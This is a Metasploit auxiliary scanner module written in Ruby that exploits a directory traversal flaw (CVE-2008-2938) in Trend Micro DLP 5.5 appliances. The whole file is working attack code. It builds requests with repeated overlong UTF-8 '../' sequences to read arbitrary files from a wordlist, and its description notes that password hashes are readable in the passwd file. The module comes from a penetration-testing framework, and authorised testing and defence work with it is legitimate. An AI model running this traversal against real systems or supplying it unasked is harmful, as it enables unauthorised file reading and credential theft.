##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name' => 'TrendMicro Data Loss Prevention 5.5 Directory Traversal',
      'Description' => %q{
        This module tests whether a directory traversal vulnerability is present
        in Trend Micro DLP (Data Loss Prevention) Appliance v5.5 build <= 1294.
        The vulnerability appears to be actually caused by the Tomcat UTF-8
        bug which is implemented in module tomcat_utf8_traversal CVE 2008-2938.
        This module simply tests for the same bug with Trend Micro specific settings.
        Note that in the Trend Micro appliance, /etc/shadow is not used and therefore
        password hashes are stored and anonymously accessible in the passwd file.
        },
      'References' => [
        [ 'URL', 'http://tomcat.apache.org/' ],
        [ 'OSVDB', '47464' ],
        [ 'OSVDB', '73447' ],
        [ 'CVE', '2008-2938' ],
        [ 'URL', 'http://www.securityfocus.com/archive/1/499926' ],
        [ 'EDB', '17388' ],
        [ 'BID', '48225' ],
      ],
      'Author' => [ 'aushack' ],
      'License' => MSF_LICENSE,
      'DisclosureDate' => 'Jan 9 2009',
      'Notes' => {
        'Stability' => [CRASH_SAFE],
        'SideEffects' => [IOC_IN_LOGS],
        'Reliability' => []
      }
    )

    register_options(
      [
        Opt::RPORT(8443),
        OptBool.new('SSL', [true, 'Use SSL', true]),
        OptPath.new('SENSITIVE_FILES', [
          true, 'File containing sensitive files, one per line',
          File.join(Msf::Config.data_directory, 'wordlists', 'sensitive_files.txt')
        ]),
      ]
    )
  end

  def extract_words(wordfile)
    return [] unless wordfile && File.readable?(wordfile)

    File.readlines(wordfile, chomp: true)
  rescue ::StandardError => e
    elog(e)
    []
  end

  def find_files(files)
    traversal = '/%c0%ae%c0%ae'

    res = send_request_raw(
      {
        'method' => 'GET',
        'uri' => '/dsc/' + traversal * 10 + files # We know depth is 10
      }, 25
    )
    if res && (res.code == 200)
      print_status("Request may have succeeded on #{rhost}:#{rport}:file->#{files}! Response: \r\n#{res.body}")
      @files_found << files
    elsif res && res.code
      vprint_status("Attempt returned HTTP error #{res.code} on #{rhost}:#{rport}:file->#{files}")
    end
  end

  def run_host(_ip)
    @files_found = []

    print_status("Attempting to connect to #{rhost}:#{rport}")
    res = send_request_raw(
      {
        'method' => 'GET',
        'uri' => '/dsc/'
      }, 25
    )

    if res
      extract_words(datastore['SENSITIVE_FILES']).each do |files|
        find_files(files) unless files.empty?
      end
    end

    if @files_found.empty?
      print_error('No File(s) found')
      return
    end

    print_good('File(s) found:')

    @files_found.each do |f|
      print_good(f)
    end
  rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout => e
    vprint_error(e.message)
  rescue ::Timeout::Error, ::Errno::EPIPE => e
    vprint_error(e.message)
  end
end
